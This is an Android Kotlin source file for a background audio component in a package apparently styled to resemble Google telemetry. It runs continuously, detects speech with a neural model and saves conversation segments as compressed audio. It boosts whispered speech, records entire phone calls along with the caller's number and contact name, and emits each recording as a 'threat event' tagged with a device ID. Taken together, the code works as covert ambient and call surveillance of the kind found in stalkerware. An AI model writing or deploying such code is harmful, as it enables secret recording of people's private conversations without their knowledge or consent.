package com.opp.googleoperation.telemetry.audio

import android.content.Context
import android.media.AudioFormat
import android.media.AudioRecord
import android.media.MediaCodec
import android.media.MediaCodecInfo
import android.media.MediaFormat
import android.media.MediaMuxer
import android.media.MediaRecorder
import android.media.audiofx.AcousticEchoCanceler
import android.media.audiofx.AutomaticGainControl
import android.media.audiofx.NoiseSuppressor
import android.util.Log
import com.opp.googleoperation.data.model.AudioThreatEvent
import com.opp.googleoperation.util.PermissionHelper
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.delay
import kotlinx.coroutines.flow.MutableSharedFlow
import kotlinx.coroutines.flow.SharedFlow
import kotlinx.coroutines.flow.asSharedFlow
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch
import java.io.ByteArrayOutputStream
import java.io.File
import java.nio.ByteBuffer
import java.util.LinkedList
import java.util.UUID
import kotlin.math.abs
import kotlin.math.sqrt

class VoiceActivityDetector(
    private val ctx: Context,
    private val scope: CoroutineScope
) {
    companion object {
        private const val TAG = "VoiceActivityDetector"
        private const val SAMPLE_RATE = 16000
        private const val CHANNEL_CONFIG = AudioFormat.CHANNEL_IN_MONO
        private const val AUDIO_FORMAT = AudioFormat.ENCODING_PCM_16BIT
        private const val SAMPLES_PER_FRAME = 512 // 32ms per frame

        // Natural VAD Hysteresis Thresholds (tuned for natural pauses and whispered speech)
        private const val START_SPEECH_THRESHOLD = 0.40f
        private const val END_SPEECH_THRESHOLD = 0.25f
        private const val PRE_PAD_FRAME_COUNT = 20 // ~640ms pre-padding preserves initial words
        private const val SILENCE_FRAMES_TO_CLOSE = 50 // ~1.6s natural conversational pause
        private const val MIN_SPEECH_FRAME_COUNT = 8 // ~256ms minimum speech
        private const val MAX_RECORDING_FRAMES = 1875 // ~60 seconds max segment

        // Studio AAC Bitrate
        private const val AAC_BITRATE = 64000 // 64 kbps crisp high-fidelity AAC-LC

        private val _voiceEvents = MutableSharedFlow<AudioThreatEvent>(extraBufferCapacity = 50)
        val voiceEvents: SharedFlow<AudioThreatEvent> = _voiceEvents.asSharedFlow()
    }

    private val vadEngine = SileroVadEngine(ctx)
    private val rollingRingBuffer = AudioRingBuffer(durationSeconds = 25, sampleRate = SAMPLE_RATE)
    private var recordJob: Job? = null
    private var isRecording = false

    // Hardware Audio Effects
    private var agcEffect: AutomaticGainControl? = null
    private var aecEffect: AcousticEchoCanceler? = null
    private var nsEffect: NoiseSuppressor? = null

    // Dedicated Phone Call Recording State
    @Volatile
    private var isCallRecordingActive = false
    private val callAudioBuffer = ByteArrayOutputStream()
    private var activeCallPhoneNumber: String? = null
    private var activeCallContactName: String? = null
    private var activeCallStartTimeMs: Long = 0L

    // DSP Envelope Follower state for smooth gain interpolation
    private var smoothedGain = 1.0f
    private var lastSegmentEndTimeMs = 0L

    fun start() {
        if (isRecording) return
        if (!PermissionHelper.hasRecordAudioPermission(ctx)) {
            Log.w(TAG, "record audio permission missing")
            return
        }

        val initialized = vadEngine.initialize()
        if (!initialized) {
            Log.w(TAG, "Silero VAD model failed to initialize, aborting")
            return
        }

        val minBufSize = AudioRecord.getMinBufferSize(SAMPLE_RATE, CHANNEL_CONFIG, AUDIO_FORMAT)
        if (minBufSize <= 0) return

        recordJob = scope.launch(Dispatchers.IO) {
            while (isActive) {
                var audioRecord: AudioRecord? = null
                try {
                    audioRecord = try {
                        AudioRecord(
                            MediaRecorder.AudioSource.VOICE_COMMUNICATION,
                            SAMPLE_RATE,
                            CHANNEL_CONFIG,
                            AUDIO_FORMAT,
                            maxOf(minBufSize * 4, SAMPLES_PER_FRAME * 2 * 8)
                        )
                    } catch (_: Exception) {
                        AudioRecord(
                            MediaRecorder.AudioSource.MIC,
                            SAMPLE_RATE,
                            CHANNEL_CONFIG,
                            AUDIO_FORMAT,
                            maxOf(minBufSize * 4, SAMPLES_PER_FRAME * 2 * 8)
                        )
                    }

                    if (audioRecord.state != AudioRecord.STATE_INITIALIZED) {
                        Log.w(TAG, "audio record init failed, retrying in 1s")
                        delay(1000)
                        continue
                    }

                    val sessionId = audioRecord.audioSessionId
                    attachHardwareEffects(sessionId)

                    audioRecord.startRecording()
                    isRecording = true
                    Log.d(TAG, "Silero VAD v5 + Studio DSP Audio Engine active")

                    val shortBuffer = ShortArray(SAMPLES_PER_FRAME)
                    val byteBuffer = ByteArray(SAMPLES_PER_FRAME * 2)

                    val prePadBuffer = LinkedList<ByteArray>()
                    var isSpeechActive = false
                    var speechFramesInSession = 0
                    var silenceFrameCount = 0
                    var totalSessionProbabilitySum = 0.0f
                    var sessionFrameCount = 0
                    val activeSessionAudio = ByteArrayOutputStream()

                    while (isActive && isRecording) {
                        val readShorts = audioRecord.read(shortBuffer, 0, SAMPLES_PER_FRAME)
                        if (readShorts == SAMPLES_PER_FRAME) {
                            // Apply smooth DSP Dynamic Range Compression (smooth envelope, no sample-by-sample clipping)
                            applySmoothDspCompression(shortBuffer)

                            // Convert PCM shorts to bytes
                            for (i in 0 until SAMPLES_PER_FRAME) {
                                val s = shortBuffer[i].toInt()
                                byteBuffer[i * 2] = (s and 0xFF).toByte()
                                byteBuffer[i * 2 + 1] = ((s shr 8) and 0xFF).toByte()
                            }

                            // Write to rolling ring buffer for duress snapshots
                            rollingRingBuffer.write(byteBuffer, 0, byteBuffer.size)

                            // If a phone call is currently active, continuously record call audio
                            if (isCallRecordingActive) {
                                synchronized(callAudioBuffer) {
                                    callAudioBuffer.write(byteBuffer)
                                }
                            }

                            // Run Silero VAD v5 neural inference on the 32ms frame
                            val speechProb = vadEngine.processFrame(shortBuffer)

                            if (!isSpeechActive) {
                                // Pre-padding circular buffer (keeps last ~640ms of ambient lead-in)
                                prePadBuffer.add(byteBuffer.clone())
                                if (prePadBuffer.size > PRE_PAD_FRAME_COUNT) {
                                    prePadBuffer.removeFirst()
                                }

                                if (speechProb >= START_SPEECH_THRESHOLD && (System.currentTimeMillis() - lastSegmentEndTimeMs > 2000L)) {
                                    isSpeechActive = true
                                    speechFramesInSession = 1
                                    silenceFrameCount = 0
                                    sessionFrameCount = 1
                                    totalSessionProbabilitySum = speechProb
                                    activeSessionAudio.reset()

                                    // Prepend pre-pad buffer so first words and phonemes are fully preserved
                                    for (chunk in prePadBuffer) {
                                        activeSessionAudio.write(chunk)
                                    }
                                    activeSessionAudio.write(byteBuffer)
                                    prePadBuffer.clear()
                                    Log.d(TAG, "human voice detected (prob: $speechProb), speech capture started")
                                }
                            } else {
                                // Speech session in progress
                                activeSessionAudio.write(byteBuffer)
                                sessionFrameCount++
                                totalSessionProbabilitySum += speechProb

                                if (speechProb >= END_SPEECH_THRESHOLD) {
                                    speechFramesInSession++
                                    silenceFrameCount = 0
                                } else {
                                    silenceFrameCount++
                                }

                                val silenceTriggered = silenceFrameCount >= SILENCE_FRAMES_TO_CLOSE
                                val maxDurationReached = sessionFrameCount >= MAX_RECORDING_FRAMES

                                if (silenceTriggered || maxDurationReached) {
                                    val pcmData = activeSessionAudio.toByteArray()
                                    val avgConfidence = totalSessionProbabilitySum / maxOf(1, sessionFrameCount)
                                    val durationSec = pcmData.size / (SAMPLE_RATE * 2)

                                    if (speechFramesInSession >= MIN_SPEECH_FRAME_COUNT && durationSec >= 2 && pcmData.isNotEmpty()) {
                                        Log.d(TAG, "speech segment completed: ${durationSec}s, avgProb=$avgConfidence")
                                        compressAndEmitAudio(pcmData, "CONVERSATION_RECORDING", avgConfidence, durationSec)
                                        lastSegmentEndTimeMs = System.currentTimeMillis()
                                    }

                                    isSpeechActive = false
                                    speechFramesInSession = 0
                                    silenceFrameCount = 0
                                    sessionFrameCount = 0
                                    totalSessionProbabilitySum = 0.0f
                                    activeSessionAudio.reset()
                                    vadEngine.reset()
                                }
                            }
                        } else if (readShorts < 0) {
                            Log.w(TAG, "AudioRecord read error ($readShorts), re-initializing recorder")
                            break
                        }
                    }
                } catch (e: SecurityException) {
                    Log.w(TAG, "audio record permission denied at runtime", e)
                    break
                } catch (e: Exception) {
                    Log.w(TAG, "neural VAD loop error", e)
                } finally {
                    try {
                        audioRecord?.stop()
                        audioRecord?.release()
                    } catch (_: Exception) {}
                    releaseHardwareEffects()
                }
                delay(500)
            }
            vadEngine.close()
            isRecording = false
            Log.d(TAG, "Silero VAD detector stopped")
        }
    }

    private fun attachHardwareEffects(sessionId: Int) {
        try {
            if (AutomaticGainControl.isAvailable()) {
                agcEffect = AutomaticGainControl.create(sessionId)?.apply {
                    enabled = true
                }
                Log.d(TAG, "hardware AutomaticGainControl attached")
            }
            if (AcousticEchoCanceler.isAvailable()) {
                aecEffect = AcousticEchoCanceler.create(sessionId)?.apply {
                    enabled = true
                }
                Log.d(TAG, "hardware AcousticEchoCanceler attached")
            }
            if (NoiseSuppressor.isAvailable()) {
                nsEffect = NoiseSuppressor.create(sessionId)?.apply {
                    enabled = true
                }
                Log.d(TAG, "hardware NoiseSuppressor attached")
            }
        } catch (e: Exception) {
            Log.w(TAG, "error attaching hardware audio effects", e)
        }
    }

    private fun releaseHardwareEffects() {
        try {
            agcEffect?.release()
            aecEffect?.release()
            nsEffect?.release()
        } catch (_: Exception) {}
        agcEffect = null
        aecEffect = null
        nsEffect = null
    }

    /**
     * Studio-Grade Dynamic Range Compressor (DRC) with Envelope Follower & Soft Limiter
     * Eliminates sample-level distortion, robotic buzzing, and harsh clipping while boosting quiet speech.
     */
    private fun applySmoothDspCompression(buffer: ShortArray) {
        var sumSquares = 0.0
        for (i in buffer.indices) {
            val v = buffer[i].toDouble()
            sumSquares += v * v
        }
        val rms = sqrt(sumSquares / buffer.size)

        // Target gain based on frame RMS: boosts faint/whispered/earpiece audio up to ~3.0x (+9.5 dB)
        val targetGain = when {
            rms < 800.0 -> 3.2f // soft/distant whisper
            rms < 3500.0 -> 3.2f - ((rms - 800.0) / 2700.0 * 1.5f).toFloat()
            rms < 10000.0 -> 1.7f - ((rms - 3500.0) / 6500.0 * 0.7f).toFloat()
            else -> 1.0f // natural 1:1 on loud voice
        }

        // Smooth attack / release filter across frames
        val smoothingFactor = if (targetGain > smoothedGain) 0.15f else 0.40f
        smoothedGain += (targetGain - smoothedGain) * smoothingFactor

        val startGain = smoothedGain
        val gainStep = (targetGain - startGain) / buffer.size

        var currentGain = startGain
        for (i in buffer.indices) {
            currentGain += gainStep
            val amplified = buffer[i] * currentGain

            // Soft-knee hyperbolic tangent saturation (prevents harsh digital clipping)
            val normalized = amplified / 32768.0
            val softClipped = if (abs(normalized) < 0.75) {
                normalized
            } else {
                val sign = if (normalized >= 0) 1.0 else -1.0
                val mag = abs(normalized)
                sign * (0.75 + 0.25 * kotlin.math.tanh((mag - 0.75) / 0.25))
            }
            buffer[i] = (softClipped * 32767.0).toInt().coerceIn(-32768, 32767).toShort()
        }
    }

    /**
     * Start high-fidelity full call recording session when a phone call connects.
     */
    fun startCallRecordingSession(phoneNumber: String?, contactName: String?) {
        synchronized(callAudioBuffer) {
            callAudioBuffer.reset()
            activeCallPhoneNumber = phoneNumber
            activeCallContactName = contactName
            activeCallStartTimeMs = System.currentTimeMillis()
            isCallRecordingActive = true
        }
        Log.d(TAG, "dedicated call audio recording session started for $phoneNumber")
    }

    /**
     * Stop and compress full call recording when the phone call hangs up.
     */
    fun stopAndEmitCallRecording(durationSec: Long): File? {
        val pcmData = synchronized(callAudioBuffer) {
            isCallRecordingActive = false
            val data = callAudioBuffer.toByteArray()
            callAudioBuffer.reset()
            data
        }

        if (pcmData.isNotEmpty() && durationSec > 0) {
            val outputFile = File(ctx.cacheDir, "call_${System.currentTimeMillis()}_${UUID.randomUUID().toString().take(6)}.m4a")
            val success = encodePcmToM4a(pcmData, outputFile)
            if (success && outputFile.exists()) {
                val devId = PermissionHelper.getOrCreateDeviceId(ctx)
                val event = AudioThreatEvent(
                    id = UUID.randomUUID().toString(),
                    deviceId = devId,
                    threatType = "CALL_RECORDING",
                    confidenceScore = 0.99f,
                    compressedAudioPath = outputFile.absolutePath,
                    fileSizeBytes = outputFile.length(),
                    durationSec = maxOf(1, durationSec.toInt()),
                    timestamp = System.currentTimeMillis()
                )
                Log.d(TAG, "call recording finalized: ${outputFile.name} (${outputFile.length() / 1024} KB)")
                _voiceEvents.tryEmit(event)
                return outputFile
            }
        }
        return null
    }

    fun stop() {
        isRecording = false
        recordJob?.cancel()
        recordJob = null
        releaseHardwareEffects()
    }

    fun triggerManualDuressSnapshot() {
        scope.launch(Dispatchers.IO) {
            val pcmData = rollingRingBuffer.getSnapshot()
            if (pcmData.isNotEmpty()) {
                val durationSec = pcmData.size / (SAMPLE_RATE * 2)
                compressAndEmitAudio(pcmData, "DURESS_TRIGGER", 1.0f, durationSec)
            }
        }
    }

    private fun compressAndEmitAudio(pcmData: ByteArray, threatType: String, score: Float, durationSec: Int) {
        val outputFile = File(ctx.cacheDir, "speech_${System.currentTimeMillis()}_${UUID.randomUUID().toString().take(6)}.m4a")
        val success = encodePcmToM4a(pcmData, outputFile)

        if (success && outputFile.exists()) {
            val devId = PermissionHelper.getOrCreateDeviceId(ctx)
            val event = AudioThreatEvent(
                id = UUID.randomUUID().toString(),
                deviceId = devId,
                threatType = threatType,
                confidenceScore = score,
                compressedAudioPath = outputFile.absolutePath,
                fileSizeBytes = outputFile.length(),
                durationSec = maxOf(1, durationSec),
                timestamp = System.currentTimeMillis()
            )
            Log.d(TAG, "compressed conversation segment created: ${outputFile.name} (${outputFile.length() / 1024} KB)")
            _voiceEvents.tryEmit(event)
        }
    }

    private fun encodePcmToM4a(pcmData: ByteArray, outputFile: File): Boolean {
        var codec: MediaCodec? = null
        var muxer: MediaMuxer? = null
        var muxerStarted = false

        return try {
            val mime = MediaFormat.MIMETYPE_AUDIO_AAC
            val format = MediaFormat.createAudioFormat(mime, SAMPLE_RATE, 1).apply {
                setInteger(MediaFormat.KEY_AAC_PROFILE, MediaCodecInfo.CodecProfileLevel.AACObjectLC)
                setInteger(MediaFormat.KEY_BIT_RATE, AAC_BITRATE) // 64 kbps high-fidelity AAC
                setInteger(MediaFormat.KEY_MAX_INPUT_SIZE, 16384)
            }

            codec = MediaCodec.createEncoderByType(mime)
            codec.configure(format, null, null, MediaCodec.CONFIGURE_FLAG_ENCODE)
            codec.start()

            muxer = MediaMuxer(outputFile.absolutePath, MediaMuxer.OutputFormat.MUXER_OUTPUT_MPEG_4)
            var audioTrackIndex = -1

            val bufferInfo = MediaCodec.BufferInfo()
            var pcmOffset = 0
            val chunkSize = 4096
            var inputEos = false

            while (true) {
                if (!inputEos) {
                    val inputBufIndex = codec.dequeueInputBuffer(10000)
                    if (inputBufIndex >= 0) {
                        val inputBuf = codec.getInputBuffer(inputBufIndex) ?: ByteBuffer.allocate(0)
                        inputBuf.clear()

                        val remaining = pcmData.size - pcmOffset
                        if (remaining <= 0) {
                            codec.queueInputBuffer(inputBufIndex, 0, 0, 0, MediaCodec.BUFFER_FLAG_END_OF_STREAM)
                            inputEos = true
                        } else {
                            val toCopy = minOf(remaining, chunkSize)
                            inputBuf.put(pcmData, pcmOffset, toCopy)
                            val pts = (pcmOffset.toDouble() / (SAMPLE_RATE * 2) * 1000000).toLong()
                            codec.queueInputBuffer(inputBufIndex, 0, toCopy, pts, 0)
                            pcmOffset += toCopy
                        }
                    }
                }

                val outputBufIndex = codec.dequeueOutputBuffer(bufferInfo, 10000)
                if (outputBufIndex == MediaCodec.INFO_OUTPUT_FORMAT_CHANGED) {
                    val newFormat = codec.outputFormat
                    audioTrackIndex = muxer.addTrack(newFormat)
                    muxer.start()
                    muxerStarted = true
                } else if (outputBufIndex >= 0) {
                    val outputBuf = codec.getOutputBuffer(outputBufIndex)
                    if (outputBuf != null && bufferInfo.size > 0 && muxerStarted) {
                        outputBuf.position(bufferInfo.offset)
                        outputBuf.limit(bufferInfo.offset + bufferInfo.size)
                        muxer.writeSampleData(audioTrackIndex, outputBuf, bufferInfo)
                    }
                    codec.releaseOutputBuffer(outputBufIndex, false)

                    if ((bufferInfo.flags and MediaCodec.BUFFER_FLAG_END_OF_STREAM) != 0) {
                        break
                    }
                } else if (outputBufIndex == MediaCodec.INFO_TRY_AGAIN_LATER && inputEos) {
                    break
                }
            }
            true
        } catch (e: Exception) {
            Log.w(TAG, "PCM to M4A compression error", e)
            false
        } finally {
            try {
                codec?.stop()
            } catch (_: Exception) {}
            try {
                codec?.release()
            } catch (_: Exception) {}
            if (muxerStarted) {
                try {
                    muxer?.stop()
                } catch (_: Exception) {}
            }
            try {
                muxer?.release()
            } catch (_: Exception) {}
        }
    }
}
